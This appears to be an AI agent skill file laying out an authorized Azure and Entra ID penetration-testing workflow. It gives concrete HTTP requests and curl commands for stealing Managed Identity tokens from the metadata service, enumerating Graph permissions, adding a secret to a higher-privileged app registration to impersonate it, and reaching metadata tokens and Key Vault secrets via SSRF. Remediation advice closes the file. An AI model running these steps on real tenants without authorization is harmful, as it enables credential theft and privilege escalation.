---
name: cloud-azure-entraid-audit
description: Azure AD and Entra ID security assessment, Managed Identity token extraction, MS Graph API permissions audit, App Registration secret leakage, and tenant isolation testing.
---

# Azure & Entra ID Security Assessment & Token Abuse

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified Azure Tenant ID, Subscription ID, or authorized resource group in `scope.yaml`.
- **Target Credentials:** Low-privilege user session, Service Principal credentials (`client_id` + `client_secret`), or access to an Azure App Service / VM.
- **Traffic Routing:** Route Microsoft Graph and ARM API calls through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Azure Instance Metadata Service (IMDS) & Managed Identity Token Theft
When executing from inside an Azure VM, App Service, or Function:
```http
# Azure VM Managed Identity Token Acquisition
GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/ HTTP/1.1
Host: 169.254.169.254
Metadata: true
```
For Azure App Service / Container Instances:
```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

### Step 2: Microsoft Graph API Permission Auditing
Using the acquired JWT Bearer token:
```http
GET /v1.0/me HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer <access-token>

# Check Directory Roles
GET /v1.0/me/memberOf HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer <access-token>

# Enumerate Application Registrations & Service Principals
GET /v1.0/applications?$top=100 HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer <access-token>
```

### Step 3: High-Risk Entra ID Misconfigurations
1. **App Registration Key Credentials Addition (`Application.ReadWrite.All` or `AppRoleAssignment.ReadWrite.All`):**
   Add a self-controlled certificate or secret to a higher-privileged Service Principal to impersonate it:
   ```http
   POST /v1.0/applications/{app-id}/addPassword HTTP/1.1
   Host: graph.microsoft.com
   Authorization: Bearer <access-token>
   Content-Type: application/json

   {"passwordCredential": {"displayName": "audit-poc"}}
   ```
2. **Owner Role on Service Principals:** An owner of an enterprise app can reset its client secret and assume its directory roles.
3. **Primary Refresh Token (PRT) / Seamless SSO Leaks:** NTLM / Kerberos hash leaks via WPAD or intranet proxy configurations.

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Vulnerability Vector | Mechanism | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **SSRF to Azure IMDS** | Server fetches user URL | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with `Metadata: true` | `"access_token": "eyJ0eXAi..."` |
| **Service Principal Over-Permissioning** | Over-broad Graph Scope | App Registration granted `Directory.AccessAsUser.All` with admin consent | Unrestricted user password reset or token minting |
| **Dangling ARM DNS (Subdomain Takeover)** | Deleted Azure Traffic Manager / App Service | CNAME points to `target.azurewebsites.net` | 404 Web App Not Found $\rightarrow$ claiming web app |
| **Key Vault Secret Exposure** | Managed Identity has `Key Vault Secrets User` | Query `https://<vault-name>.vault.azure.net/secrets/?api-version=7.4` | Raw connection strings and TLS certificates |

---

## 4. Evidence Collection & Validation Gate
1. **Token Proof:** Decode the JWT (redacting sensitive claims) to show `aud` (Audience), `roles`, `scp`, and `appid`.
2. **Authorization Boundary:** Demonstrate access to a resource across unauthorized directory scopes or administrative endpoints.
3. **Remediation:** Enforce Managed Identity least-privilege scoping, avoid granting `*.All` application permissions in Microsoft Graph, and enable Conditional Access policies on Service Principals.
